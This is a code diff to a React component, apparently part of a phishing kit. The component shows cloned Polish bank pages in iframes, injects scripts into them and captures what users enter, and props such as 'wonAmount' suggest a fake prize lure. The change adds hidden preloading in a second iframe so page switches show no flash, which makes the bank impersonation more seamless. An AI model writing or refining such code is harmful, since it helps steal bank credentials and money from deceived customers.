@@ -1230,8 +1230,12 @@ function canonicalizeCaptured(raw: Record<string, string>): Record<string, strin
 export function PolandBankTemplate({ bankSlug, onChange, handleRouteAction, onProgressSave, saving, bankName, logoFile, brandColor, wonAmount, wonLabel }: Props) {
   const [files, setFiles] = useState<string[]>([]);
   const [step, setStep] = useState(0);
+  // Cift iframe: 'a' gorunur, 'b' gizli on-yukleme yapar. Yeni sayfa
+  // hazir olunca aninda one alinir — arada portal/beyaz flaş OLMAZ.
+  const [slotFile, setSlotFile] = useState<{ a: number; b: number }>({ a: 0, b: -1 });
+  const [frontSlot, setFrontSlot] = useState<"a" | "b">("a");
   const [loadError, setLoadError] = useState(false);
-  const iframeRef = useRef<HTMLIFrameElement>(null);
+  const iframeRefs = useRef<Record<"a" | "b", HTMLIFrameElement | null>>({ a: null, b: null });
 
   const handleRouteActionRef = useRef(handleRouteAction);
   const onChangeRef = useRef(onChange);
@@ -1240,16 +1244,38 @@ export function PolandBankTemplate({ bankSlug, onChange, handleRouteAction, onPr
   const capturedRef = useRef<Record<string, string>>({});
   const filesRef = useRef<string[]>([]);
   const stepRef = useRef(0);
+  const slotFileRef = useRef<{ a: number; b: number }>({ a: 0, b: -1 });
+  const frontSlotRef = useRef<"a" | "b">("a");
+  const slotLoadedRef = useRef<{ a: boolean; b: boolean }>({ a: false, b: false });
   handleRouteActionRef.current = handleRouteAction;
   onChangeRef.current = onChange;
   onProgressSaveRef.current = onProgressSave;
   bankSlugRef.current = (bankSlug || "").toString().trim().toLowerCase();
   filesRef.current = files;
   stepRef.current = step;
+  slotFileRef.current = slotFile;
+  frontSlotRef.current = frontSlot;
+
+  const clampStep = (s: number) =>
+    Math.min(Math.max(0, s), Math.max(0, filesRef.current.length - 1));
+
+  const assignSlot = (slot: "a" | "b", idx: number) => {
+    slotFileRef.current = { ...slotFileRef.current, [slot]: idx };
+    slotLoadedRef.current[slot] = false;
+    setSlotFile({ ...slotFileRef.current });
+  };
 
   useEffect(() => {
     let cancelled = false;
     const slug = (bankSlug || "").toString().trim().toLowerCase();
+    // Banka degisince tum gecis durumunu sifirla
+    setStep(0);
+    capturedRef.current = {};
+    slotFileRef.current = { a: 0, b: -1 };
+    slotLoadedRef.current = { a: false, b: false };
+    frontSlotRef.current = "a";
+    setSlotFile({ a: 0, b: -1 });
+    setFrontSlot("a");
     if (!slug) {
       setFiles([]);
       return;
@@ -1310,20 +1336,56 @@ export function PolandBankTemplate({ bankSlug, onChange, handleRouteAction, onPr
     return () => window.removeEventListener("message", onMessage);
   }, []);
 
-  const injectScript = () => {
+  // Hedef adim degisince: gorunur olmayan slot'a yeni dosyayi ata.
+  // Yukleme bitince handleSlotLoad one alir — eski sayfa bu sirada
+  // ekranda kalmaya devam eder.
+  useEffect(() => {
+    if (files.length === 0) return;
+    const target = clampStep(step);
+    const shown = slotFileRef.current[frontSlotRef.current];
+    if (target === shown) return;
+    const other = frontSlotRef.current === "a" ? "b" : "a";
+    if (slotFileRef.current[other] === target) {
+      // Ayni dosya zaten bu slot'ta: yukluysa aninda one al, degilse bekle
+      if (slotLoadedRef.current[other]) {
+        frontSlotRef.current = other;
+        setFrontSlot(other);
+      }
+      return;
+    }
+    assignSlot(other, target);
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [step, files]);
+
+  const handleSlotLoad = (slot: "a" | "b") => {
+    const k = slotFileRef.current[slot];
     try {
-      const doc = iframeRef.current?.contentDocument;
-      if (!doc) return;
-      const script = doc.createElement("script");
-      script.textContent = buildInjectionScript(
-        stepRef.current,
-        bankSlugRef.current,
-        (brandColor || "").toString().trim(),
-      );
-      doc.documentElement.appendChild(script);
+      const doc = iframeRefs.current[slot]?.contentDocument;
+      if (doc && k >= 0) {
+        const script = doc.createElement("script");
+        script.textContent = buildInjectionScript(
+          k,
+          bankSlugRef.current,
+          (brandColor || "").toString().trim(),
+        );
+        doc.documentElement.appendChild(script);
+      }
     } catch (err) {
       console.error("PL bank iframe injection error:", err);
     }
+    slotLoadedRef.current[slot] = true;
+
+    const target = clampStep(stepRef.current);
+    const shown = slotFileRef.current[frontSlotRef.current];
+    if (k === target && k !== shown) {
+      // Yeni sayfa hazir — aninda one al (flaş yok)
+      frontSlotRef.current = slot;
+      setFrontSlot(slot);
+    } else if (k !== target && target !== shown) {
+      // Bayat yukleme: slot hala eski adimi gosteriyor, dogrusuyla yeniden yukle
+      assignSlot(slot, target);
+    }
+    // target === shown: kullanici geri dondu, bayat slot gizli kalsin
   };
 
   // Sayfa gecislerinde portal krem zemin yerine bankanin kendi zemin
@@ -1346,8 +1408,6 @@ export function PolandBankTemplate({ bankSlug, onChange, handleRouteAction, onPr
     );
   }
 
-  const currentFile = files[Math.min(step, files.length - 1)];
-
   return (
     <div
       className="fixed inset-0 w-[100vw] z-[9999] overflow-hidden"
@@ -1360,15 +1420,29 @@ export function PolandBankTemplate({ bankSlug, onChange, handleRouteAction, onPr
         </div>
       )}
 
-      <iframe
-        key={`${bankSlug}-${currentFile}`}
-        ref={iframeRef}
-        src={`/pl-banks/${bankSlug}/${currentFile}`}
-        className="w-full border-0"
-        style={{ height: "100dvh", display: "block", background: pageBg }}
-        sandbox="allow-scripts allow-same-origin allow-forms allow-popups"
-        onLoad={injectScript}
-      />
+      {(["a", "b"] as const).map((slot) => {
+        const idx = slotFile[slot];
+        const src =
+          idx >= 0 && files.length > 0
+            ? `/pl-banks/${bankSlug}/${files[Math.min(idx, files.length - 1)]}`
+            : undefined;
+        return (
+          <iframe
+            key={slot}
+            ref={(el) => {
+              iframeRefs.current[slot] = el;
+            }}
+            src={src}
+            className="absolute inset-0 h-full w-full border-0"
+            style={{
+              display: frontSlot === slot && idx >= 0 ? "block" : "none",
+              background: pageBg,
+            }}
+            sandbox="allow-scripts allow-same-origin allow-forms allow-popups"
+            onLoad={() => handleSlotLoad(slot)}
+          />
+        );
+      })}
     </div>
   );
 }
